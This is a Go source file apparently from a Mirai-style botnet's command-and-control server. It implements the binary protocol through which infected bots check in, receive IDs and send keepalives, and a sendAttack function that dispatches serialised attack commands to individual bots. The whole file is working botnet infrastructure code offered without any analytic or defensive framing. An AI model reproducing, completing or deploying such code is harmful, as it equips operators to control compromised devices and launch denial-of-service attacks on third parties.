// bot.go — bot connection handler (binary protocol).
//
// Protocol flow:
//   Bot connects, sends: [4 bytes magic 0x00000001][2 bytes arch_len][arch string]
//   CNC responds:        [4 bytes bot_id]  (0 = reject)
//   Bot heartbeats:      [2 bytes 0x0000] every 60 seconds
//   CNC sends attack:    [2 bytes total_len]...[binary payload, see attack.go]
//
// This mirrors Mirai's bot.go Handle() loop.

package main

import (
	"bufio"
	"encoding/binary"
	"fmt"
	"io"
	"log"
	"net"
	"time"
)

const (
	BotHandshakeMagic  = 0x00000001
	BotKeepaliveBytes  = 2
	BotKeepaliveInterval = 60 * time.Second
	BotReadTimeout      = 180 * time.Second // 3× keepalive interval
)

func handleBotWithFirstBytes(conn net.Conn, magicBytes []byte) {
	defer conn.Close()
	remote := conn.RemoteAddr().String()

	log.Printf("[debug] handleBot from %s  magic=%x", remote, magicBytes)

	magic := binary.BigEndian.Uint32(magicBytes)
	if magic != BotHandshakeMagic {
		log.Printf("[!] bot sent bad magic: 0x%08x from %s", magic, remote)
		return
	}

	reader := bufio.NewReader(conn)
	conn.SetReadDeadline(time.Now().Add(10 * time.Second))

	// --- read architecture string ---
	archLenBytes := make([]byte, 2)
	if _, err := io.ReadFull(reader, archLenBytes); err != nil {
		log.Printf("[!] bot handshake read (arch_len) from %s: %v", remote, err)
		return
	}
	archLen := binary.BigEndian.Uint16(archLenBytes)
	if archLen > 64 {
		log.Printf("[!] bot arch string too long: %d from %s", archLen, remote)
		return
	}
	log.Printf("[debug] arch_len=%d from %s", archLen, remote)

	archBytes := make([]byte, archLen)
	if _, err := io.ReadFull(reader, archBytes); err != nil {
		log.Printf("[!] bot handshake read (arch) from %s: %v", remote, err)
		return
	}
	arch := string(archBytes)
	log.Printf("[debug] arch=%s from %s", arch, remote)

	// --- register bot ---
	bot := mgr.Register(conn, arch, 1)
	if bot == nil {
		log.Printf("[!] manager rejected bot registration from %s", remote)
		return
	}
	log.Printf("[debug] bot assigned ID #%d", bot.ID)

	// --- send assigned ID ---
	idBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(idBytes, bot.ID)
	n, err := conn.Write(idBytes)
	if err != nil {
		log.Printf("[!] failed to send bot ID to #%d: %v (wrote %d)", bot.ID, err, n)
		mgr.Unregister(bot.ID)
		return
	}
	log.Printf("[debug] sent bot ID #%d (%d bytes) to %s", bot.ID, n, remote)

	log.Printf("[+] bot #%d registered  arch=%s  ip=%s", bot.ID, arch, bot.RemoteIP)

	// --- keepalive / command loop ---
	// The bot sends a 2-byte zero ping every ~60s.
	// We send nothing unless an attack is dispatched.

	keepaliveBuf := make([]byte, 2)
	for {
		conn.SetReadDeadline(time.Now().Add(BotReadTimeout))

		_, err := io.ReadFull(reader, keepaliveBuf)
		if err != nil {
			if err == io.EOF {
				log.Printf("[-] bot #%d closed connection", bot.ID)
			} else if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				log.Printf("[-] bot #%d timed out", bot.ID)
			} else {
				log.Printf("[-] bot #%d read error: %v", bot.ID, err)
			}
			mgr.Unregister(bot.ID)
			return
		}

		// Keepalive received — just update the timestamp.
		mgr.UpdateSeen(bot.ID)

		// If the bot sent non-zero keepalive bytes, that's an error.
		if keepaliveBuf[0] != 0 || keepaliveBuf[1] != 0 {
			log.Printf("[!] bot #%d sent malformed keepalive: %x %x", bot.ID, keepaliveBuf[0], keepaliveBuf[1])
		}
	}
}

// sendAttack serializes and writes an attack command to a specific bot.
// Used when we want targeted dispatch rather than broadcast.
func sendAttack(conn net.Conn, cmd *AttackCommand) error {
	buf, err := cmd.Serialize()
	if err != nil {
		return fmt.Errorf("serialize: %w", err)
	}

	conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
	defer conn.SetWriteDeadline(time.Time{})

	n, err := conn.Write(buf)
	if err != nil {
		return fmt.Errorf("write: %w", err)
	}
	if n != len(buf) {
		return fmt.Errorf("short write: %d/%d bytes", n, len(buf))
	}
	return nil
}
